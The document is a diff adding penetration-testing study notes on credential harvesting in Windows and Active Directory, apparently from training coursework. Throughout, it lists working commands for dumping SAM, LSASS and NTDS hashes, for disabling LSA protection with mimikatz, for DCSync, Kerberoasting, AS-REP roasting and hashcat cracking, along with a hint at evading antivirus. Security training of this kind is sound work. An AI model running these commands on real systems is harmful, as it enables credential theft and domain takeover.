@@ -1,0 +1,198 @@
+- There are two types
+	- **External**
+		- Involves phishing emails and other techniques to trick a user into entering his username and password.
+	- **Internal**
+		- Obtaining credentials through internal networks after compromising machine(s).
+- Credentials are stored insecurely in various locations in systems
+	- **Clear-text files**
+		- Searching compromised machines in local or remote file systems.
+		- Some of the types of clear-text files commands history, configuration files (Web App, FTP files, etc..), files related to Windows Applications (Internet Browsers, Email Clients, etc..), backup files, shared files and folders, registry
+		- PowerShell commands are saved in a history file in a user profile in `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. 
+		- Looking inside the registry for the keyword "password" `reg query HKLM /f password /t REG_SZ /s` and `reg query HKCU /f password /t REG_SZ /s`.
+			- Source Code
+	- **Database files**
+	- **Memory**
+	- **Password Managers**
+	- **Enterprise Vaults**
+	- **Active Directory**
+		- Some of the AD misconfigurations that may leak user's credentials
+			- **User's description:** Administrators set a password in the description for new employees and leave it there `Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description`.
+			- **Group Policy SYSVOL:** Leaked encryption keys let attackers access administrator accounts.
+			- **NTDS:** Contains AD users' credentials.
+				- **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks
+	- **Network Sniffing**
+- ## *Local Windows Credentials*
+	- #### *Keystrokes*
+		- Keylogger software can be used in a busy and interactive environment, if a compromised target has a logged-in user, we can perform keylogging using tools like Metasploit framework or others.
+	- #### *Security Account Manager (SAM)*
+		- Microsoft Windows database that contains local account information such as usernames and passwords.
+		- These details are stored in encrypted format in either RC4 or AES algorithms.
+		- It can't be read or accessed by any users while the Windows OS is running. However, there are various ways and attacks to dump the content of the SAM database.
+		- **Metasploit HashDump**
+			- Used to get a copy of the SAM database.
+			- Uses in-memory code injection to the LSASS.exe process to dump copy hashes.
+			- In meterpreter session, `getuid` and `hashdump`.
+		- **Volume Shadow Copy Service**
+			- Helps perform a volume backup while applications read/write on volumes.
+			- Using `wmic` to create a shadow volume copy. This has to be done through the CMD with administrative privileges
+				- Run CMD with administrator privileges.
+				- Execute the `wmic` command to create a shadow copy of C: drive.
+				- Verify the creation.
+				- Copy the SAM database from the shadow volume `wmic shadowcopy call create Volume='C:\'`.
+				- Use `vssadmin`, Volume Shadow Copy Service administrative CMD tool, to list and confirm the shadow copy creation `vssadmin list shadows`.
+				- As the SAM database is encrypted, we need the decryption key which is stored in `C:\Windows\System32\Config\System`.
+				- Use `scp` to transfer these files to our own machine.
+		- **Registry Hives**
+			- Windows Registry also stores a copy of some of the SAM database content to be used by Windows Services.
+			- We can save the value of the Windows registry using
+				- Run the CMD with administrative privileges.
+				- `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
+				- `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`
+			- Decrypt the file using `secretsdump.py` from Impacket tools `python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-ng -system /tmp/system-reg LOCAL`.
+- ## *Local Security Authority Subsystem Service (LSASS)*
+	- LSASS is a Windows process that handles the OS security policy and enforces it on system.
+	- It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets.
+	- Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.
+	- if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt.
+	- #### *GUI*
+		- To dump any running Windows process
+			- Open the Task Manager
+			- From Details tab, find the required process
+			- Right-click on it, and select "Create Dump File"
+			- After the dumping is finished, a popup with the path will appear.
+		- Copy and transfer it to the attacking machine to extract the NTLM hashes offline.
+		- Copy the dumped process to the mimikatz folder.
+	- #### **Sysinternals Suite**
+		- If GUI isn't available to us, use `ProcDump`, a Sysinternals process dump utility that runs from the CMD.
+		- `C:\tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump`.
+		- The dump process is writing to disk, and dumping the LSASS process is a known technique, so AV products may flag it as malicious.
+		- In real-world scenarios, we may be more creative and write code to encrypt or implement a method to bypass AV products.
+	- #### *Mimikatz*
+		- Post-exploitation tool that enables other useful attacks, such as Pass-the-Hash, Pass-the-Ticket, or building Golden Kerberos tickets.
+		- It deals with OS memory to access information, so it requires administrator and system privileges in order to dump memory and extract credentials.
+		- **Steps**
+			- `.\mimikatz.exe` from an administrator CMD.
+			- `privilege::debug` which checks the current permissions for memory access.
+			- `sekurlsa::logonpasswords` to access the memory and dump all cached passwords and hashes from the `lsass.exe` process.
+		- **Protected LSASS**
+			- Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory.
+			- To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` to 1.
+			- Running the above steps to dump memory using mimikatz would now give an error.
+			- Mimikatz has a driver called `mimidrv.sys` that works on kernel level to disable the LSA protection.
+			- Import it to mimikatz by executing `!+`.
+			- Once the driver is loaded, disable LSA protection using `!processprotect /process:lsass.exe /remove`.
+			- Now, if we run the above steps to dump memory using mimikatz, it would work.
+- ## *Credentials Manager*
+	- A Windows feature that stores logon-sensitive information for websites, applications, and networks.
+	- It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories
+		- Web credentials contain authentication details stored in Internet browsers or other applications.
+		- Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
+		- Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
+		- Certificate-based credentials: Authenticated details based on certifications.
+	- #### *Accessing Credential Manager*
+		- Could be accessed through GUI (Control Panel > User Accounts > Credential Manager) or through CMD.
+		- `vaultcmd /list` to list current Windows vaults.
+		- By default, Windows should have 2 vaults, one for Web and the other for Windows machine credentials.
+		- Check the web credentials vault using `vaultcmd /listproperties:"Web Credentials"`.
+		- Get more information about the stored credentials using `vaultcmd /listcreds:"Web Credentials"`.
+		- `vaultcmd` can't show the passwords, we can rely on other PowerShell scripts such as [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1).
+			- `powershell -ex bypass`
+			- `Import-Module C:\Tools\Get-WebCredentials.ps1`
+			- `Get-WebCredentials`
+	- #### *RunAs*
+		- A command-line built-in tool that allows running Windows applications or tools under different users' permissions.
+		- It contains various command arguments that could be used in the Windows system.
+			- `/savecred` allows us to save the credentials of the user in Windows Credentials Manager.
+		- `cmdkey` a tool used to enumerate stored credentials, allows us to create, delete, and display stored Windows credentials.
+			- `/list` argument to show all stored credentials, or display more details using `/list:computername`.
+		- Using `runas /savecred /user:<username> cmd.exe` to open CMD as the found creds.
+	- #### *Mimikatz*
+		- `.\mimikatz.exe`
+		- `privilege::debug`
+		- `sekurlsa::credman`
+- ## *Domain Controller*
+	- #### *NTDS Domain Controller*
+		- New Technology Directory Services is a database containing all AD data, including objects, attributes, credentials, etc.
+		- Consists of the following tables
+			- **Schema table:** contains types of objects and their relationships
+			- **Link table:** contains the object's attributes and their values.
+			- **Data type:** contains users and groups.
+		- NTDS is located in `C:\Windows\NTDS` by default, and is encrypted to prevent data extraction from a target machine.
+		- Accessing the `NTDS.dit` file from the machine running is disallowed since the file is used by AD and is locked.
+		- Decrypting the NTDS file requires a system Boot Key to attempt to decrypt the LSA Isolated credentials, which is stored in the `SECURITY` file system.
+	- #### *Ntdsutil*
+		- Windows utility used to manage and maintain AD configurations.
+		- It can be used to
+			- Restore deleted objects in AD.
+			- Perform maintenance for the AD database.
+			- AD snapshot management.
+			- Set Directory Services Restore Mode (DSRM) administrator passwords.
+		- **Local Dumping (No Credentials)**
+			- If we have no credentials available but have administrative access to the DC.
+			- Will rely on Windows utilities to dump the NTDS file and crack them offline.
+			- Assuming we have administrative access to DC, to successfully dump the contents of the NTDS file, we need the following
+				- `C:\Windows\NTDS\ntds.dit`
+				- `C:\Windows\System32\config\SYSTEM`
+				- `C:\Windows\System32\config\SECURITY`
+			- Dump the NTDS file using `Ntdsutil` tool `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`.
+			- In the `c:\temp\` directory, there should be two folders Active Directory and registry, which contains the three files we need.
+			- Transfer them to attacking machine and run `secretsdump.py` script to extract the hashes from the dumped memory file `python3.9 /opt/impacket/examples/secretsdump.py -security <path-to-SECURITY> -system <path-to-SYSTEM> -ntds <path-to-ntds.dit> local`.
+		- **Remote Dumping (With Credentials)**
+			- **DC Sync**
+				- A known attack within AD environment to dump credentials remotely.
+				- Works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions
+					- Replicating Directory Changes
+					- Replicating Directory Changes All
+					- Replicating Directory Changes in Filtered Set
+				- These configurations could are used to perform domain replication.
+				- `python3.9 /opt/impacket/examples/secretsdump.py -just-dc <domain>/<AD-admin-user>@<target-ip>`.
+					- `-just-dc` for extracting the NTDS data.
+				- If we only needed the NTLM hashes we could use `-just-dc-ntlm`.
+				- Once we obtained the hashes, we can either impersonate or crack the hash using tool such as `hashcat -m 1000 -a 0 /<path-to-ntlm-hashes>.txt <path-to-wordlist>`.
+- ## *Local Administrator Password Solution (LAPS)*
+	- #### *Group Policy Preferences (GPP)*
+		- Windows has a built-in Administrator account which can be accessed using a password.
+		- Changing passwords in a large Windows environment is challenging, that's why Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences.
+		- GPP is a tool that allows administrators to create domain policies with embedded credentials.
+		- Once the GPP is deployed, different XML files are created in the SYSVOL folder.
+		- SYSVOL creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permissions.
+		- The GPP relevant XML files contained a password encrypted using AES-256 bit, it was a good encryption back then until Microsoft somehow published its private key on [MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).
+		- Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).
+	- #### *LAPS*
+		- In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.
+		- The new method includes two new attributes (`ms-mcs-AdmPwd` and `ms-mcs-AdmPwdExpirationTime`) of computer objects in the Active Directory
+			- `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator.
+			- `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password.
+		- LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.
+		- **Enumerate for LAPS**
+			- Check if LAPS is installed using `dir "C:\Program Files\LAPS\CSE"`.
+			- Check available commands to use using `Get-Command *AdmPwd*`.
+			- Find which AD Organizational Unit (OU) has the "All extended rights" attribute that deals with LAPS `Find-AdmPwdExtendedRights -Identity *` or specify a target `Find-AdmPwdExtendedRights -Identity THMorg`.
+			- After getting the group that has the right access to LAPS, check the group and members using `net groups <group-name>`.
+			- Get the user details using `net user <username>`.
+			- Either impersonate a user or compromise him.
+			- Get the LAPS password using `Get-AdmPwdPassword -ComputerName <ComputerName>`.
+		- It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, like [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit).
+- ## *Kerberoasting*
+	- A common AD attack to obtain AD tickets that helps with persistence.
+	- In order for this attack to work, we have to have access to SPN (Service Principal Name) accounts such as IIS user, MSSQL, etc..
+	- Involves requesting a TGT and TGS.
+	- Get SPN and SPN user using `python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip <target-DC-ip> <domain>/<username>`.
+	- Using the SPN and the user found Get TGS ticket using `python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip <target-DC-ip> <domain>/<username> -request-user <SPN-user>`.
+	- Crack the obtained TGS using `hashcat -a 0 -m 13100 <SPN-hash> <path-to-wordlist>`.
+- ## *AS-REP Roasting*
+	- A technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication".
+	- This option relies on the old Kerberos authentication protocol, which allows authentication without a password.
+	- Once we obtain the hashes, we can try to crack it offline.
+	- During the enumeration phase we should have a list of domain accounts.
+	- Search for a user with `Do not require Kerberos preauthentication` setting using `python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip <target-DC-ip> <domain>/ -usersfile /tmp/users.txt`.
+	- Once the user is found, the tool will generate the ticket.
+	- `GetNPUsers` has the options to export the tickets as John or hashcat format using the `-format` argument for cracking.
+- ## *SMB Relay Attack*
+	- Abuses the NTLM authentication mechanism. The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes.
+	- For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources.
+- ## *LLMNR/NBNS Poisoning*
+	- Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails.
+	- If a a machine tries to communicate but DNS fails to resolve, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.
+	- The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service.
+- The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine.
